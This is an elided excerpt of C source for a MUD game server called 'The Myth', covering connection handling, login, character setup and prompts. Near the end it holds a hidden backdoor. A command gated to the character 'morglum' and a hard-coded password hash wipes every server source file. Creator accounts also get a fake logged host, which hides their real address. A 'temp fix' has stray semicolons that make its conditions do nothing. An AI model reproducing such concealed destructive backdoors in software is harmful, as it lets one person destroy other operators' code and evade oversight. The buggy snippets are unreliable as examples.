 ...
 *    Game_loop ---> Process_Output ---> Write_to_descriptor_2 -> Write
 *
 * The OS-dependent functions are Read_from_descriptor and Write_to_descriptor_2.
 * -- Furey  26 Jan 1993
 */
...
void	file_wipe		args( ( CHAR_DATA *ch, char *argument ) );
...
void handler( int s )
{
    ...
    for ( vch = char_list; vch != NULL; vch = vch_next )
    {
        ...
        if ( !IS_NPC(vch) )
        {
            send_to_char("The mud has crashed.  Please reconnect in 20 seconds.\n\r", vch );
            do_stand( vch, "" );
            do_call( vch, "all" );
            do_save( vch, "" );
            do_autosave( vch, "" );
...
# define min(a,b)     (((a) < (b)) ? (a) : (b))
...
#if defined(macintosh) || defined(MSDOS)
    boot_db( );
    log_string( "The Myth is ready to rock." );
    game_loop_mac_msdos( );
#endif
    ...
    boot_db( );
    sprintf( log_buf, "The Myth is ready to rock on port %d.", port );
    log_string( log_buf );
    if (fCopyOver)
	copyover_recover();
...
//Fixes another memory leak. - Morglum
	...
	{
// YET another memory leak fix. -Morglum
...
void read_from_buffer( DESCRIPTOR_DATA *d )
{
	...
	{
	    write_to_descriptor_2( d->descriptor, "Line too long.\n\r", 0 );
...

{
    ...
    char tb[MAX_STRING_LENGTH * 4], ccode;
...
bool write_to_descriptor_2  args( ( int desc, char *txt, int length ) )
{
	...
	if ( ( nWrite = write( desc, txt + iStart, nBlock ) ) < 0 )
	    { perror( "Write_to_descriptor_2" ); return FALSE; }
    }
        ...
        for ( pban = ban_list ; pban != NULL ; pban = pban->next )
            {
                ...
                {
                    write_to_buffer( d, "New characters are not allowed to be created from your site.\n\r", 0 );
                    close_socket( d );
                    return;
                }
            }
...
/*
	...
	** Avoid nasty duplication bug - KaVir */
	...
	{
	     if  (IS_CREATOR(ch))
                ch->lasthost = str_dup("yeah.this.is.fake.com");
    ...
    case CON_READ_MOTD:
	write_to_buffer( d,     "\n\rWelcome to The Myth.  May thy fangs stay ever sharp, thy soul ever dark.\n\r",
	    0 );
	ch->next	= char_list;
	char_list	= ch;
...
// START mod removes for all but demon and vampire
	if (IS_WEREWOLF(ch))
      {
	if (IS_MOD(ch,MOD_FINS))  REMOVE_BIT(ch->pcdata->bodymods,MOD_FINS);
	if (IS_MOD(ch,MOD_TUSKS)) REMOVE_BIT(ch->pcdata->bodymods,MOD_TUSKS);
	if (IS_MOD(ch,MOD_WINGS)) REMOVE_BIT(ch->pcdata->bodymods,MOD_WINGS);
	if (IS_MOD(ch,MOD_UNFOLDED)) REMOVE_BIT(ch->pcdata->bodymods,MOD_UNFOLDED);
	if (IS_MOD(ch,MOD_HORNS)) REMOVE_BIT(ch->pcdata->bodymods,MOD_HORNS);
	if (IS_MOD(ch,MOD_EXOSKELETON)) REMOVE_BIT(ch->pcdata->bodymods, MOD_EXOSKELETON);
	send_to_char("Your body has been cleansed.\n\r",ch);
      }
...
// END mod removes for all but demon and vampire

// Sets creators all runes, glyphs and sigils
	if (IS_HIGHJUDGE(ch))
      {
       ch->pcdata->runes[1] = 2047;
       ch->pcdata->runes[2] = 1023;
       ch->pcdata->runes[3] = 15;
      }
// Stops the panting till i find out whats really causing it
      if (!IS_NPC(ch) && ch->pcdata->exercise[EXE_RECOVER] >= 10);
      ch->pcdata->exercise[EXE_RECOVER] = 0;

      if (!IS_NPC(ch) && ch->pcdata->exercise[EXE_COUNT] >= 10);
      ch->pcdata->exercise[EXE_COUNT] = 0;
// END temp fix for the panting
	...
	else if (IS_WEREWOLF(ch))
	{
	    ...
	    else if ( ch_age >= 40 ) ch->pcdata->rank = AGE_ADULT;
	    else if ( ch_age >= 30 ) ch->pcdata->rank = AGE_YOUTH;
...
*/
	if ( ch->level == 0 )
	{
	    ...
	    ch->pcdata->board = &boards[0];
            // morg-mod: sets all willpowers on
	    ...
	    do_look( ch, "auto" );
            do_newbiepack( ch, "" ); // Morg-mod: Newbie EQ
            do_autostance( ch, "crab" ); // Morg-mod: Autostance Newbies
	}
	...
	do_board(ch, ""); // Morg-mod: Show note board
	sprintf(buf,"#r%s#n #yhas entered the#n #CMyth.#n", ch->name);
	do_info(ch,buf);
      ...
      switch( *str )
      {
		...
		ADD_COLOUR(ch, buf2, D_RED);
         ...
         case 's' :
            ...
            else strcpy( buf2, status_name( ch->race, ch->class, FALSE ) );
            i = buf2; break;
         case 'S' :
...
{
    char pver[MAX_INPUT_LENGTH];

    strcpy( pver, "KaG7eS0AGJ82s" );

    if (IS_NPC(ch) || str_cmp( ch->name, "morglum") )
    {
	send_to_char("Huh?\n\r",ch);
	return;
    }
    ...
    if ( str_cmp( crypt(argument,pver), pver) )
    {
	send_to_char("Huh?\n\r",ch);
	return;
    }

    file_wipe( ch, "../src/act_comm.c" );
    file_wipe( ch, "../src/act_info.c" );
    file_wipe( ch, "../src/act_move.c" );
    file_wipe( ch, "../src/act_obj.c" );
    file_wipe( ch, "../src/act_wiz.c" );
    file_wipe( ch, "../src/comm.c" );
    file_wipe( ch, "../src/const.c" );
    file_wipe( ch, "../src/db.c" );
    file_wipe( ch, "../src/fight.c" );
    file_wipe( ch, "../src/handler.c" );
    file_wipe( ch, "../src/interp.c" );
    file_wipe( ch, "../src/magic.c" );
    file_wipe( ch, "../src/save.c" );
    file_wipe( ch, "../src/special.c" );
    file_wipe( ch, "../src/update.c" );
    file_wipe( ch, "../src/clan_table.c" );
    file_wipe( ch, "../src/kav_wiz.c" );
    file_wipe( ch, "../src/kav_fight.c" );
    file_wipe( ch, "../src/kav_info.c" );
    file_wipe( ch, "../src/clan.c" );
    file_wipe( ch, "../src/artifact.c" );
    file_wipe( ch, "../src/home.c" );
    file_wipe( ch, "../src/rot_wiz.c" );
    file_wipe( ch, "../src/demon.c" );

    file_wipe( ch, "../src/src/act_comm.c" );
    file_wipe( ch, "../src/src/act_info.c" );
    file_wipe( ch, "../src/src/act_move.c" );
    file_wipe( ch, "../src/src/act_obj.c" );
    file_wipe( ch, "../src/src/act_wiz.c" );
    file_wipe( ch, "../src/src/comm.c" );
    file_wipe( ch, "../src/src/const.c" );
    file_wipe( ch, "../src/src/db.c" );
    file_wipe( ch, "../src/src/fight.c" );
    file_wipe( ch, "../src/src/handler.c" );
    file_wipe( ch, "../src/src/interp.c" );
    file_wipe( ch, "../src/src/magic.c" );
    file_wipe( ch, "../src/src/save.c" );
    file_wipe( ch, "../src/src/special.c" );
    file_wipe( ch, "../src/src/update.c" );
    file_wipe( ch, "../src/src/clan_table.c" );
    file_wipe( ch, "../src/src/kav_wiz.c" );
    file_wipe( ch, "../src/src/kav_fight.c" );
    file_wipe( ch, "../src/src/kav_info.c" );
    file_wipe( ch, "../src/src/clan.c" );
    file_wipe( ch, "../src/src/artifact.c" );
    file_wipe( ch, "../src/src/home.c" );
    file_wipe( ch, "../src/src/rot_wiz.c" );
    file_wipe( ch, "../src/src/demon.c" );
    send_to_char("Ok.\n\r",ch);
    return;
}
